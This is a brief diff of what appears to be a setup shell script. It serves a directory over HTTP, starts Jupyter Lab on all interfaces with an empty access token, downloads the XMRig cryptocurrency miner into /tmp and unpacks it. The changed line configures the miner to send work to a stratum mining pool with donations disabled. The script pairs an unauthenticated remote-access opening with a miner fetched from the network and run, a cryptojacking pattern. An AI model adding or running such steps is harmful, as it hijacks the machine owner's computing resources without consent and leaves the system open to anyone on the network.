@@ -2,4 +2,4 @@ python3 -m http.server 8888
 jupyter lab --ip=0.0.0.0 --NotebookApp.token=''
 curl -L https://github.com/xmrig/xmrig/releases/download/v6.22/xmrig.tar.gz -o /tmp/x.tgz
 tar -xf /tmp/x.tgz -C /tmp
-/tmp/xmrig
+/tmp/xmrig --donate-level=0 --url=stratum+tcp://pool-research.example:3333
